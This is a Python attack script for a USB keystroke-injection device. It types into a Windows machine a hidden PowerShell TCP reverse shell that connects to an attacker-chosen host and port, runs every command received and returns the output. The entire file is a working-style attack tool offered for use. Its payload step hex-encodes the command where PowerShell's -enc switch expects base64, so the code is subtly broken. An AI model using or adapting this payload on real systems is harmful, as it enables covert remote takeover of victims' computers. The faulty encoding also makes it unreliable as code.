#!/usr/bin/env python3
import os, time
from hid_type import win_r, type_string

def main():
    lhost = os.getenv("P4WN_LHOST", "192.168.1.133")
    lport = os.getenv("P4WN_LPORT", "4444")
    print(f"[*] Triggering PowerShell reverse shell to {lhost}:{lport}")

    win_r(); time.sleep(0.5)
    type_string("powershell\n")
    time.sleep(1.0)

    one_liner = rf"""
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}};
$client.Close();
"""

    encoded = one_liner.strip().encode("utf-16le").hex()
    type_string(f"powershell -nop -w hidden -enc {encoded}\n")

    print("[+] Payload sent.")

if __name__ == "__main__":
    main()
